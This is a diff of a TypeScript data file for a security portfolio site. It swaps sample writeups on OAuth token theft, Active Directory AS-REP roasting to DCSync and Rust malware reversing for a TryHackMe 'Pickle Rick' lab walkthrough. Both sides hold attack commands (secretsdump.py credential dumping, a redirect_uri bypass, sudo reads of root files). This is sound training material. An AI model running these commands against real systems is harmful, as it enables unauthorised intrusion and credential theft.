@@ -2,114 +2,96 @@ import { Writeup } from '@/types/content';
 
 export const sampleWriteups: Writeup[] = [
   {
-    id: '1',
-    title: 'PortSwigger OAuth 2.0 Account Takeover',
-    slug: 'portswigger-oauth-account-takeover',
-    date: '2026-08-01',
-    platform: 'PortSwigger',
-    difficulty: 'Hard',
-    category: 'Web Security',
-    tags: ['OAuth 2.0', 'JWT', 'Account Takeover'],
-    summary: 'Exploiting unvalidated redirect URIs and implicit grant token leaks to achieve pre-auth account takeover.',
+    id: 'thm-pickle-rick',
+    title: 'TryHackMe: Pickle Rick Walkthrough',
+    slug: 'tryhackme-pickle-rick',
+    date: '2026-08-04',
+    platform: 'TryHackMe',
+    difficulty: 'Easy',
+    category: 'Web Exploitation',
+    tags: ['web', 'command-injection', 'privilege-escalation', 'sudo'],
+    summary: 'A Rick and Morty themed CTF challenge requiring web reconnaissance, command injection vulnerability exploitation, and sudo privilege escalation to retrieve all three secret ingredients.',
     readingTime: '8 min read',
+    featuredImage: '/writeups/tryhackme/pickle_rick/banner.png',
     featured: true,
     objectives: [
-      'Bypass redirect URI regex filters using path traversal.',
-      'Exfiltrate implicit grant fragment tokens.',
-      'Implement strict URL whitelist policies.',
+      'Perform web enumeration with Nmap and GoBuster.',
+      'Exploit unauthenticated command execution in the web portal.',
+      'Escalate privileges using misconfigured sudo permissions (sudo -l).',
     ],
-    prerequisites: ['OAuth 2.0 Implicit Grant Flow', 'Burp Suite Repeater'],
-    tools: ['Burp Suite Pro', 'OAuth Flaw Finder', 'Python Exploit Server'],
+    tools: ['Nmap', 'GoBuster', 'Burp Suite', 'Netcat'],
     content: `
-## Overview
+### 1. Initial Reconnaissance & Scanning
 
-OAuth 2.0 implementations frequently fail at enforcing strict redirect URI validation. When an identity provider (IdP) relies on regex matching for \`redirect_uri\`, access tokens can be leaked to external origins.
+We start by running an Nmap scan against the target IP address to discover open ports and running services:
 
-### Key Exploitation Steps
+\`\`\`bash
+nmap -sC -sV -oN nmap/initial.nmap $TARGET_IP
+\`\`\`
 
-1. **Path Traversal Probing**:
-   Submitting \`redirect_uri=https://client.xomnibot.in/callback/../open-redirect\` allowed bypassing domain whitelists.
+#### Discovered Services:
+- **Port 22 (SSH)**: Open (OpenSSH 7.2p2)
+- **Port 80 (HTTP)**: Open (Apache httpd 2.4.18)
 
-2. **Token Harvesting**:
-   URL fragments (\`#access_token=...\`) were preserved across HTTP 302 redirects to our attacker server log.
+Next, inspect the web application running on port 80. Viewing the page source reveals a hidden username comment:
 
-### Mitigation Guidance
+\`\`\`html
+<!-- Note to self: Username is R1ckRul3s -->
+\`\`\`
 
-- Enforce exact string matching for registered \`redirect_uri\` endpoints.
-- Enforce PKCE (Proof Key for Code Exchange) across all clients.
-`,
-  },
-  {
-    id: '2',
-    title: 'Active Directory Attack Chain: AS-REP Roasting to DCSync',
-    slug: 'tryhackme-ad-enterprise-chain',
-    date: '2026-07-20',
-    platform: 'Active Directory',
-    difficulty: 'Hard',
-    category: 'Active Directory',
-    tags: ['Kerberos', 'AS-REP Roasting', 'BloodHound', 'DCSync'],
-    summary: 'Full attack path from unauthenticated AS-REP roasting to BloodHound ACL traversal and DCSync domain compromise.',
-    readingTime: '10 min read',
-    featured: true,
-    objectives: [
-      'Request TGT hashes via GetNPUsers.py.',
-      'Crack hashes using Hashcat mode 18200.',
-      'Execute DCSync via secretsdump.py.',
-    ],
-    prerequisites: ['Kerberos Authentication Protocols', 'Impacket Framework'],
-    tools: ['Impacket', 'BloodHound', 'Hashcat', 'Evil-WinRM'],
-    content: `
-## Overview
+---
 
-Active Directory misconfigurations allow rapid lateral movement. This walkthrough covers kerberos roasting and ACL exploitation.
+### 2. Directory Fuzzing & Ingredient #1
 
-### Key Exploitation Steps
+Using **GoBuster** to enumerate directories and files:
 
-1. **AS-REP Roasting**:
-   \`\`\`bash
-   GetNPUsers.py CORP.LOCAL/ -no-pass -usersfile users.txt -dc-ip 10.10.120.5
-   \`\`\`
+\`\`\`bash
+gobuster dir -u http://$TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+\`\`\`
 
-2. **Privilege Escalation via BloodHound**:
-   Compromised account possessed GenericAll rights over \`svc_sql\`, which held DCSync permissions.
+#### Key Findings:
+- \`/robots.txt\` -> Contains string: \`Wubbalubbadubdub\`
+- \`/login.php\` -> Login portal interface
 
-3. **DCSync Domain Takeover**:
-   \`\`\`bash
-   secretsdump.py CORP.LOCAL/svc_sql:'Pass123!'@10.10.120.5 -just-dc-ntlm
-   \`\`\`
-`,
-  },
-  {
-    id: '3',
-    title: 'Reverse Engineering a Custom Rust Loader',
-    slug: 'htb-malware-rust-loader-rev',
-    date: '2026-07-05',
-    platform: 'Hack The Box',
-    difficulty: 'Insane',
-    category: 'Reverse Engineering',
-    tags: ['Reverse Engineering', 'Rust', 'IDA Pro', 'Anti-Analysis'],
-    summary: 'Bypassing PEB anti-debugging checks, extracting AES payload keys, and inspecting unhooked direct NTDLL syscalls.',
-    readingTime: '12 min read',
-    featured: true,
-    objectives: [
-      'Patch PEB BeingDebugged checks in x64dbg.',
-      'Extract runtime AES-256 decryption keys.',
-      'Dump unhooked syscall shellcode regions.',
-    ],
-    prerequisites: ['x86_64 Assembly', 'Dynamic Debugging'],
-    tools: ['IDA Pro', 'x64dbg', 'PE-bear', 'Process Hacker'],
-    content: `
-## Overview
+Using username \`R1ckRul3s\` and password \`Wubbalubbadubdub\`, we gain access to the Command Panel.
 
-Compiled Rust binaries produce heavy code output and stripped symbols.
+![Command Panel](/writeups/tryhackme/pickle_rick/panel.png)
 
-### Key Exploitation Steps
+Executing commands in the panel reveals **Ingredient 1**:
 
-1. **Anti-Debugging Bypass**:
-   Patched EAX register during PEB \`BeingDebugged\` check execution in x64dbg.
+\`\`\`bash
+cat "Sup3r_S3cur3_fl4g.txt"
+\`\`\`
 
-2. **Runtime Memory Dumping**:
-   Dumped decrypted memory region at runtime using Process Hacker to extract beacon payload.
-`,
+---
+
+### 3. Privilege Escalation & Ingredients #2 & #3
+
+Checking \`sudo -l\` permissions:
+
+\`\`\`bash
+sudo -l
+\`\`\`
+
+Output shows user \`www-data\` can run **all commands as root without a password**:
+
+\`\`\`bash
+(ALL : ALL) NOPASSWD: ALL
+\`\`\`
+
+We can read the remaining ingredients directly using \`sudo cat\`:
+
+\`\`\`bash
+sudo cat /home/rick/second\ ingredient
+sudo cat /root/3rd.txt
+\`\`\`
+
+---
+
+### Defensive Mitigation & Lessons Learned
+
+1. **Disable Plaintext Secrets in HTML**: Never leave hardcoded usernames or passwords in public client-side comments or \`robots.txt\`.
+2. **Restrict Web Server Sudo Rights**: Restrict \`www-data\` from executing arbitrary root commands via \`/etc/sudoers\`.
+    `,
   },
 ];
